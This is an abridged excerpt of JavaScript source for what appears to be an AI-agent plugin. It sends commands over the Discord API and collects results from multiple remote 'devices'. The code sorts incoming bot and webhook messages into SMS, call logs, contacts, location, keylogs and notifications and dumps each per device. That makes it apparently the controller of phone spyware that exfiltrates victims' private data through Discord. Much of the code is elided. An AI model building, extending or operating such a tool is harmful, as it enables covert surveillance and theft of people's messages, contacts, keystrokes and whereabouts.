...
export default definePluginEntry({
    ...
    register(api) {
        const pluginConfig = api.runtime.config.current();
        ...
        const workspaceDir = String(cleanConfig?.agents?.list?.find((a) => a.id === "main")?.workspace || "/home/ayu/openclaw-main/hello");
        ...
        const dumpData = async (type, content, deviceId = "unknown", messageId) => {
            if (!messageId)
                return;
            if (dumpedMessageIds.has(messageId))
                return;
            dumpedMessageIds.add(messageId);
            if (dumpedMessageIds.size > 2000)
                dumpedMessageIds.clear();
            try {
        ...
        const requestDiscord = (method, endpoint, token, body) => {
        ...
        const downloadTextAttachment = (url) => {
            return new Promise((resolve, reject) => {
                https.get(url, (res) => {
                    let data = "";
            ...
            try {
                ...
                if (Array.isArray(messages) && messages.length > 0) {
                    ...
                    for (const m of messages) {
                        ...
                        if (!m.webhook_id && (!m.author || !m.author.bot))
                            continue;
                        ...
                        if (lower.includes("sms"))
                            category = "sms";
                        else if (lower.includes("call log") || lower.includes("callogs") || lower.includes("calllogs"))
                            category = "calllogs";
                        else if (lower.includes("contact"))
                            category = "contacts";
                        else if (lower.includes("location") || lower.includes("lat:") || lower.includes("long:"))
                            category = "location";
                        else if (lower.includes("keylog") || lower.includes("typing") || lower.includes("keys"))
                            category = "keys";
                        else if (lower.includes("notif"))
                            category = "notifs";
        ...
        const sendAndCollect = async (command, dumpType) => {
                    ...
                    try {
                        ...
                        if (Array.isArray(messages) && messages.length > 0) {
                            ...
                            for (const m of messages) {
                                ...
                                if (dumpType)
                                    await dumpData(dumpType, result, deviceId, m.id);
                                collectedResults.push(`[Device: ${deviceId}]\n${result}`);
                                if (!timer)
                                    timer = setTimeout(finalize, 5000); // Wait 5s for other devices
                            }
                        }
                    }
                    catch (e) {
